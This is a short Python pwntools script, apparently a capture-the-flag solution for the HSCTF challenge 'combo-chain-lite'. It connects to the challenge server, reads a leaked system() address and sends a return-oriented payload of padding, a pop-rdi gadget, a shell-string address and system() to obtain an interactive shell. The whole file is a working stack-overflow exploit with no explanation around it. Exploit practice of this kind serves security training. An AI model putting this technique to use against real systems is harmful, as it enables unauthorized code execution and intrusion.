#!/usr/bin/env python

from pwn import *
SERVER = True
if SERVER:
	host, port = 'pwn.hsctf.com', 3131
	p = remote(host, port)
else:
	p = process('./combo-chain-lite')


p.recvuntil("Here's your free computer: ")
system = int(p.recv(14), 16)
bash = 0x402051
rdi_pop = 0x0000000000401273
#craft payload
padding = "A"*16
payload = padding
payload+= p64(rdi_pop)
payload+= p64(bash)
payload+= p64(system)
p.sendline(payload)
p.interactive()